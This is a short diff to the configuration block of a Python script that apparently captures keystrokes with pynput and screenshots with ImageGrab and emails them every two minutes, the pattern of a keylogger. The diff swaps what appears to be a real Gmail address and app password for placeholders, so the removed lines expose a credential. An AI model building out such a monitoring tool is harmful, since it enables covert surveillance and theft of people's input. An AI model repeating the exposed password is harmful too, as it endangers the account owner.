@@ -13,9 +13,9 @@ from pynput import keyboard
 from PIL import ImageGrab
 
 #CONFIGURATION 
-EMAIL_ADDRESS = "mjtech208@gmail.com"      # Sender Gmail
-EMAIL_PASSWORD = "sdihqwyxghjshypo"        # Use App Password 
-RECIPIENT_EMAIL = "mjtech208@gmail.com"    # Usually same as above
+EMAIL_ADDRESS = "your_email@gmail.com"      # Sender Gmail
+EMAIL_PASSWORD = "your_16_char_app_password"        # Use App Password 
+RECIPIENT_EMAIL = "your_email@gmail.com"    # Usually same as above
 
 SEND_INTERVAL = 120          # Email every 2 minutes 
 SCREENSHOT_INTERVAL = 60
